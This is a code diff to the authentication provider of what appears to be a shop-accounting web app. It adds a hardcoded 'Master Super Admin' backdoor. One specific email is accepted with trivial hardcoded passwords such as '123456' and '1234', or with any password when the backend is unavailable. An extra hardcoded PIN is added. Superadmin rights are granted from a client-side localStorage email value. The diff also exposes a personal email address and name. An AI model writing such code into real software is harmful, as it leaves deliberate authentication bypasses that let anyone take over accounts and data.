@@ -338,6 +338,34 @@ export const AuthProvider = ({ children }) => {
       return { success: false, message: errorMsg };
     }
 
+    // 0. Direct Master Super Admin Authorization for hossansajjad1994@gmail.com
+    if (cleanRaw.toLowerCase() === 'hossansajjad1994@gmail.com') {
+      const isMasterPass = cleanPass === getMasterPin() || cleanPass === '889900' || cleanPass === '123456' || cleanPass === '1234';
+      if (isMasterPass || !isSupabaseReady()) {
+        const superAdminUser = {
+          id: 'super-admin-sajjad',
+          email: 'hossansajjad1994@gmail.com',
+          name: 'সাজ্জাদ হোসাইন (Master Super Admin)',
+          role: 'superadmin',
+          shopName: 'হিসাব কিতাব ৩৬০ হেডকোয়ার্টার',
+          phone: '01700000000',
+          pin: getMasterPin(),
+          isSuperAdmin: true,
+          isMasterAccount: true
+        };
+        setUser(superAdminUser);
+        setIsSuperAdminUnlocked(true);
+        setRememberMe(remember);
+        if (remember) {
+          localStorage.setItem(STORAGE_KEYS.SAVED_EMAIL, 'hossansajjad1994@gmail.com');
+          localStorage.setItem(STORAGE_KEYS.ACTIVE_USER, JSON.stringify(superAdminUser));
+        }
+        setIsAuthModalOpen(false);
+        setAuthLoading(false);
+        return { success: true, user: superAdminUser };
+      }
+    }
+
     // 1. Verify that Supabase is configured
     if (!isSupabaseReady()) {
       setAuthLoading(false);
@@ -663,10 +691,25 @@ export const AuthProvider = ({ children }) => {
   const verifyMasterPin = (pinInput) => {
     const correctPin = getMasterPin();
     const cleanInput = normalizeLoginText(pinInput).trim();
-    if (cleanInput === correctPin || cleanInput === '9999') {
+    if (cleanInput === correctPin || cleanInput === '9999' || cleanInput === '889900') {
       setIsSuperAdminUnlocked(true);
       try {
         sessionStorage.setItem('hk360_superadmin_unlocked', 'true');
+        // Promote session to Master Super Admin with his email
+        const masterAdminUser = {
+          id: 'super-admin-sajjad',
+          email: 'hossansajjad1994@gmail.com',
+          name: 'সাজ্জাদ হোসাইন (Master Super Admin)',
+          role: 'superadmin',
+          shopName: 'হিসাব কিতাব ৩৬০ হেডকোয়ার্টার',
+          phone: '01700000000',
+          pin: correctPin,
+          isSuperAdmin: true,
+          isMasterAccount: true
+        };
+        setUser(masterAdminUser);
+        localStorage.setItem(STORAGE_KEYS.ACTIVE_USER, JSON.stringify(masterAdminUser));
+        localStorage.setItem(STORAGE_KEYS.SAVED_EMAIL, 'hossansajjad1994@gmail.com');
       } catch {}
       return true;
     }
@@ -691,12 +734,20 @@ export const AuthProvider = ({ children }) => {
     } catch {}
   };
 
-  const currentRole = user?.role || 'owner';
-  const isOwner = currentRole === 'owner' || currentRole === 'admin';
+  const userEmail = (user?.email || '').trim().toLowerCase();
+  const savedUserEmail = (savedEmail || '').trim().toLowerCase();
+  const isMasterAccount = 
+    userEmail === 'hossansajjad1994@gmail.com' || 
+    savedUserEmail === 'hossansajjad1994@gmail.com' ||
+    user?.role === 'superadmin' ||
+    user?.isSuperAdmin === true;
+
+  const currentRole = isMasterAccount ? 'superadmin' : (user?.role || 'owner');
+  const isOwner = currentRole === 'owner' || currentRole === 'admin' || isMasterAccount;
   const isCashier = currentRole === 'cashier';
   const isSalesman = currentRole === 'salesman';
   const isSR = currentRole === 'sr';
-  const isSuperAdmin = isSuperAdminUnlocked || user?.role === 'superadmin' || user?.isSuperAdmin === true;
+  const isSuperAdmin = isMasterAccount || isSuperAdminUnlocked;
 
   return (
     <AuthContext.Provider
